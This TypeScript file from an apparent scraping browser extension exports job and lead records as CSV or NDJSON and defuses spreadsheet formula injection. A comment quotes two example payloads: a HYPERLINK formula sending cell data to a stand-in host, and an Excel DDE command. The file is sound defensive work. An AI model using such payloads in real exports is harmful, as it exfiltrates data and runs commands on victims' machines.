import { GENERAL_FIELDS, type GeneralRecord } from "./generalSchema";
import { JOB_FIELDS, type Job } from "./schema";

/**
 * Column layouts mirror CSV_COLUMNS / GENERAL_CSV_COLUMNS in the Python engine
 * (src/job_scraper/models.py, src/general_scraper/models.py) so a CLI export and
 * an extension export can be concatenated without realigning columns.
 *
 * `source`, `keywords_matched` and `extras_json` are CLI-only concepts; they are
 * emitted empty here to keep the header identical. `starred`/`tags`/`notes` are
 * extension-only and are appended after the shared block.
 */
export const JOB_CSV_COLUMNS = [
  "id",
  ...JOB_FIELDS,
  "source",
  "keywords_matched",
  "saved_at",
  "extras_json",
  // extension-only trailing columns
  "starred",
  "tags",
  "notes",
];

export const GENERAL_CSV_COLUMNS = ["id", ...GENERAL_FIELDS, "source", "saved_at"];

/**
 * Characters a spreadsheet reads as the start of a formula.
 *
 * Mirrors src/job_scraper/csv_safe.py — every value in this export came off
 * somebody else's web page, and the workflow ends in Google Sheets. A page
 * printing `=HYPERLINK("https://evil.example/?d="&A1&B1,"Click")` lands as a
 * live formula that exfiltrates the row beside it, and `=cmd|' /C calc'!A0`
 * has been a working DDE payload in Excel for years. Quoting the cell does not
 * help: the spreadsheet strips the quotes on import and then evaluates.
 */
const RISKY_PREFIXES = ["=", "+", "-", "@", "\t", "\r", "|"];

/**
 * A value that is unambiguously a number, so a leading + or - is arithmetic
 * notation rather than a formula.
 *
 * This exemption is the whole reason this is not a one-line escape: a European
 * lead list is full of `+41 44 123 45 67`, and prefixing every phone number
 * with an apostrophe would put a stray character in front of the most valuable
 * column in the deliverable. Letters disqualify it, so `+cmd|…` is still
 * defused.
 */
const PLAIN_NUMBER = /^[+-][\d\s().\-/]*\d[\d\s().\-/]*$/;

function neutralise(value: string): string {
  if (!value) return value;
  const first = value[0];
  if (!RISKY_PREFIXES.includes(first)) return value;
  if ((first === "+" || first === "-") && PLAIN_NUMBER.test(value)) return value;
  // A leading apostrophe forces the cell to text in Excel, LibreOffice and
  // Sheets, and is consumed on import rather than rendered.
  return `'${value}`;
}

function csvCell(value: unknown): string {
  if (value == null) return '""';
  const flat = Array.isArray(value) ? value.filter(Boolean).join(", ") : String(value);
  // Escape quotes and flatten newlines so a description can't break the row,
  // then defuse anything a spreadsheet would execute.
  const safe = neutralise(flat.replace(/\r?\n/g, " "));
  return `"${safe.replace(/"/g, '""')}"`;
}

function toCsv(columns: string[], rows: Record<string, unknown>[]): string {
  const lines = [columns.join(",")];
  for (const row of rows) lines.push(columns.map((c) => csvCell(row[c])).join(","));
  // BOM so Excel opens UTF-8 correctly; CRLF per RFC 4180.
  return "﻿" + lines.join("\r\n");
}

export function toCSV(jobs: Job[]): string {
  return toCsv(JOB_CSV_COLUMNS, jobs as unknown as Record<string, unknown>[]);
}

export function toGeneralCSV(records: GeneralRecord[]): string {
  return toCsv(GENERAL_CSV_COLUMNS, records as unknown as Record<string, unknown>[]);
}

export function toNDJSON(items: unknown[]): string {
  return items.map((item) => JSON.stringify(item)).join("\n");
}

export async function downloadBlob(filename: string, blob: Blob) {
  // Convert blob to data URL — blob URLs produce UUID filenames in side panels.
  const reader = new FileReader();
  const dataUrl = await new Promise<string>((resolve, reject) => {
    reader.onloadend = () => resolve(reader.result as string);
    // Without this the promise hangs forever on a read error and the UI
    // reports neither success nor failure.
    reader.onerror = () => reject(reader.error ?? new Error("file-read-failed"));
    reader.readAsDataURL(blob);
  });
  await chrome.downloads.download({ url: dataUrl, filename });
}
